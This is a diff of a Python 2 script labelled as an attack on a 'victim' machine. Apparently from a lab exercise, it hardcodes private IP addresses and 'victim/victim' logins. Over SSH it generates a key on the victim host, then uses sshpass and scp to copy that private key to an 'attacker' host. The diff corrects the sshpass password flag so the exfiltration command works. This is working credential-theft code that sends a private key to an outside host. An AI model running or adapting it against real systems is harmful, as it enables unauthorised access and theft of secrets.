@@ -25,23 +25,33 @@ if __name__ == '__main__':
     victim, attacker = {}, {}
 
     print('[Victim]')
-    victim['ip'] = raw_input('ip: ')
-    victim['port'] = raw_input('port: ')
-    victim['name'] = raw_input('name: ')
-    victim['password'] = raw_input('password: ')
+    # victim['ip'] = raw_input('ip: ')
+    # victim['port'] = raw_input('port: ')
+    # victim['name'] = raw_input('name: ')
+    # victim['password'] = raw_input('password: ')
+
+    victim['ip'] = '192.168.31.145'
+    victim['port'] = '5555'
+    victim['name'] = 'victim'
+    victim['password'] = 'victim'
 
     print('\n[Attacker]')
-    attacker['ip'] = raw_input('ip: ')
-    attacker['port'] = raw_input('port: ')
-    attacker['name'] = raw_input('name: ')
-    attacker['password'] = raw_input('password: ')
+    # attacker['ip'] = raw_input('ip: ')
+    # attacker['port'] = raw_input('port: ')
+    # attacker['name'] = raw_input('name: ')
+    # attacker['password'] = raw_input('password: ')
+
+    attacker['ip'] = '192.168.31.101'
+    attacker['port'] = '22'
+    attacker['name'] = 'victim'
+    attacker['password'] = 'victim'
 
     try:
         print('\nUse victim/victim to ssh log into victim system')
         command = 'ssh-keygen -f /home/victim/.ssh/victim_key -P 12345'
         ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))
 
-        command = 'sshpass {0} scp /home/victim/.ssh/victim_key {1}@{2}:/home/{3}/victimKey'.format(attacker['password'], attacker['name'], attacker['ip'], attacker['name'])
+        command = 'sshpass -p {0} scp /home/victim/.ssh/victim_key {1}@{2}:/home/{3}/victimKey'.format(attacker['password'], attacker['name'], attacker['ip'], attacker['name'])
         print(command)
         ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))
 
